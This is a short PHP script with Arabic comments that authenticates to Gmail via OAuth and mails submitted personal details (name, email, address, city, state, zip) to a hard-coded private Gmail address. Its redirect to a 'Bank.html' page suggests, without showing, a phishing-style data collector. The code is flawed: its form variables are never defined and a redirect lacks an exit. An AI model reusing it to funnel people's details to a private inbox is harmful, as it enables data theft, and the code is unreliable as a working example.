<?php
require_once 'vendor/autoload.php';

session_start();

// إعداد بيانات الاعتماد
$client = new Google_Client();
$client->setClientId('YOUR_CLIENT_ID');
$client->setClientSecret('YOUR_CLIENT_SECRET');
$client->setRedirectUri('http://127.0.0.1:5501/Bank.html');  // استخدم URI المعتمد الذي قمت بتحديده
$client->addScope(Google_Service_Gmail::GMAIL_SEND);

// الحصول على رمز التفويض إذا لم يكن هناك رمز موجود
if (!isset($_GET['code'])) {
    $authUrl = $client->createAuthUrl();
    header('Location: ' . filter_var($authUrl, FILTER_SANITIZE_URL));
    exit;
} else {
    $client->authenticate($_GET['code']);
    $_SESSION['access_token'] = $client->getAccessToken();
    header('Location: ' . filter_var('send_email.php', FILTER_SANITIZE_URL));
}

$client->setAccessToken($_SESSION['access_token']);

if ($client->isAccessTokenExpired()) {
    unset($_SESSION['access_token']);
    header('Location: ' . filter_var('send_email.php', FILTER_SANITIZE_URL));
    exit;
}

// إعداد Gmail API
$gmailService = new Google_Service_Gmail($client);

// البيانات التي سيتم إرسالها عبر البريد الإلكتروني
$to = 'medosuluiman100055@gmail.com';
$subject = 'New Form Submission';
$messageText = "Full Name: $full_name\nEmail: $email\nAddress: $address\nCity: $city\nState: $state\nZip Code: $zip_code\n";

// إعداد البريد الإلكتروني
$message = new Google_Service_Gmail_Message();
$rawMessage = "From: 'your-email@gmail.com'\r\n";
$rawMessage .= "To: $to\r\n";
$rawMessage .= "Subject: $subject\r\n\r\n";
$rawMessage .= $messageText;
$rawMessage = base64url_encode($rawMessage);
$message->setRaw($rawMessage);

// إرسال البريد الإلكتروني
try {
    $gmailService->users_messages->send('me', $message);
    echo 'Email sent successfully!';
} catch (Exception $e) {
    echo 'An error occurred: ' . $e->getMessage();
}

// دالة لتحويل البيانات إلى Base64
function base64url_encode($data) {
    return rtrim(strtr(base64_encode($data), '+/', '-_'), '=');
}
?>
